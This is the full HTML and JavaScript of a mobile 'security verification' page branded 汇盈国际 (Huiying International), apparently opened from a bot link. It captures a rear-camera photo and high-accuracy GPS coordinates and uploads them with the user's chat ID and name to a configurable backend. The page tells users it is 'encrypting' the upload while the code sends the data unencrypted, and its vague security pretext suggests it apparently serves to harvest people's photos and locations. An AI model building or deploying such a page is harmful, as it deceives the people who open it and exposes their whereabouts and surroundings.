<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>汇盈国际 - 安全验证</title>
    <style>
        * { box-sizing: border-box; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        #camera-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; }
        video { width: 100%; height: 100%; object-fit: cover; }
        #canvas { display: none; }
        
        /* 界面元素 */
        .overlay-text {
            position: absolute; top: 10%; width: 100%; text-align: center;
            color: rgba(255, 255, 255, 0.7); font-size: 14px; pointer-events: none;
            z-index: 10; text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }

        /* 底部控制栏 */
        .controls {
            position: absolute; bottom: 0; left: 0; width: 100%; height: 180px;
            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
            display: flex; flex-direction: column; justify-content: flex-end; align-items: center;
            padding-bottom: 40px; z-index: 20;
        }
        
        /* 拍照主按钮 */
        .shutter-btn {
            width: 76px; height: 76px;
            background-color: rgba(255,255,255,0.9);
            border: 4px solid rgba(255,255,255,0.4); border-radius: 50%;
            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            transition: transform 0.1s; margin-bottom: 20px;
        }
        .shutter-btn:active { transform: scale(0.9); background-color: #fff; }

        /* 强制发送小按钮 */
        .force-btn {
            color: #aaa; font-size: 12px; text-decoration: underline;
            margin-top: 10px; cursor: pointer; padding: 10px;
        }

        /* 状态提示弹窗 */
        #status-modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); color: white;
            display: none; justify-content: center; align-items: center;
            z-index: 100; flex-direction: column; text-align: center; padding: 20px;
        }
        .spinner { font-size: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        /* 调试信息 */
        #debug-info {
            position: absolute; bottom: 5px; left: 0; width: 100%;
            text-align: center; color: #555; font-size: 10px;
            word-break: break-all; padding: 0 10px;
        }
    </style>
</head>
<body>

<div id="camera-container">
    <div class="overlay-text">汇盈国际 · 安全验证系统<br><span id="user-info">等待识别...</span></div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    
    <div class="controls">
        <!-- 拍照按钮 -->
        <div class="shutter-btn" id="capture-btn"></div>
        <!-- 无定位强制发送 -->
        <div class="force-btn" id="force-btn">定位失败？点击强制发送 (测试)</div>
        <!-- 显示后端地址，方便检查 -->
        <div id="debug-info">后端: 未配置</div>
    </div>
</div>

<div id="status-modal">
    <div class="spinner">↻</div>
    <div id="status-text">正在初始化...</div>
    <button id="close-modal-btn" style="margin-top:20px; padding:8px 20px; display:none; background:#333; color:#fff; border:1px solid #fff; border-radius:5px;">关闭</button>
</div>

<script>
    // =================================================================
    // ⚠️⚠️⚠️ 请务必修改这里！只改这一行！⚠️⚠️⚠️
    // 把下面的地址换成你 Render 的地址，例如 https://huiying888.onrender.com
    // 注意：不要带最后的斜杠 '/'
    const BACKEND_URL = "https://你的render服务名.onrender.com"; 
    // =================================================================

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const captureBtn = document.getElementById('capture-btn');
    const forceBtn = document.getElementById('force-btn');
    const statusModal = document.getElementById('status-modal');
    const statusText = document.getElementById('status-text');
    const debugInfo = document.getElementById('debug-info');
    const userInfo = document.getElementById('user-info');
    const closeModalBtn = document.getElementById('close-modal-btn');

    // 显示配置的后端地址
    debugInfo.innerText = "后端: " + BACKEND_URL;

    // 解析 URL 参数
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatid');
    const uid = urlParams.get('uid') || '未知ID';
    const name = urlParams.get('name') || '用户';
    
    if(name) userInfo.innerText = `正在验证: ${name}`;

    // 1. 启动相机
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'environment' }, 
                audio: false 
            });
            video.srcObject = stream;
        } catch (err) {
            alert("无法启动相机，请使用系统浏览器(Safari/Chrome)打开。\n错误: " + err.message);
        }
    }

    // 2. 核心逻辑：处理点击
    // 正常拍照 (尝试定位)
    captureBtn.addEventListener('click', () => handleCapture(true));
    
    // 强制发送 (不定位)
    forceBtn.addEventListener('click', () => handleCapture(false));

    function handleCapture(needLocation) {
        if (!chatId) {
            alert("错误：链接缺少 chatid，请从 Bot 重新进入！");
            return;
        }
        if (BACKEND_URL.includes("你的render服务名")) {
            alert("错误：前端代码未配置 Render 后端地址！请联系管理员修改 index.html");
            return;
        }

        // 拍照
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // 显示遮罩
        statusModal.style.display = 'flex';
        closeModalBtn.style.display = 'none';
        
        if (needLocation) {
            statusText.innerText = "正在获取定位...";
            navigator.geolocation.getCurrentPosition(
                (pos) => uploadPhoto(pos.coords.latitude, pos.coords.longitude),
                (err) => {
                    statusText.innerText = "定位失败，尝试自动发送...";
                    console.log("定位失败，转为无定位模式", err);
                    setTimeout(() => uploadPhoto(0, 0), 1000); // 失败后自动发 0,0
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        } else {
            statusText.innerText = "跳过定位，直接发送...";
            uploadPhoto(0, 0);
        }
    }

    // 3. 上传函数
    function uploadPhoto(lat, lng) {
        statusText.innerText = "正在加密上传...";
        
        canvas.toBlob(async (blob) => {
            try {
                const params = new URLSearchParams({
                    chatid: chatId,
                    uid: uid,
                    name: name,
                    lat: lat,
                    lng: lng,
                    time: Date.now()
                });

                // 打印完整的请求地址供调试
                console.log(`Requesting: ${BACKEND_URL}/upload?${params.toString()}`);

                const response = await fetch(`${BACKEND_URL}/upload?${params.toString()}`, {
                    method: 'POST',
                    body: blob,
                    headers: { 'Content-Type': 'application/octet-stream' } // 关键
                });

                // 检查 HTTP 状态码
                if (!response.ok) {
                    throw new Error(`HTTP Error: ${response.status}`);
                }

                const result = await response.json();
                
                if (result.code === 0) {
                    statusText.innerText = "✅ 验证成功！";
                    setTimeout(() => {
                        window.close(); // 尝试关闭窗口
                        statusText.innerText = "上传完成，请手动关闭此页面";
                    }, 1500);
                } else {
                    throw new Error(result.msg || "未知后端错误");
                }
            } catch (err) {
                console.error(err);
                statusText.innerText = "❌ 发送失败";
                
                // 显示详细错误给用户看
                const debugMsg = document.createElement('div');
                debugMsg.style.fontSize = "12px";
                debugMsg.style.marginTop = "10px";
                debugMsg.style.color = "#ff6b6b";
                debugMsg.innerText = `错误详情: ${err.message}\n目标地址: ${BACKEND_URL}`;
                statusModal.appendChild(debugMsg);

                closeModalBtn.style.display = 'block'; // 显示关闭按钮让用户重试
                
                closeModalBtn.onclick = () => {
                    statusModal.style.display = 'none';
                    // 清理错误信息
                    if(debugMsg.parentNode) debugMsg.parentNode.removeChild(debugMsg);
                };
            }
        }, 'image/jpeg', 0.7); // 压缩质量 0.7
    }

    // 启动
    startCamera();
</script>
</body>
</html>
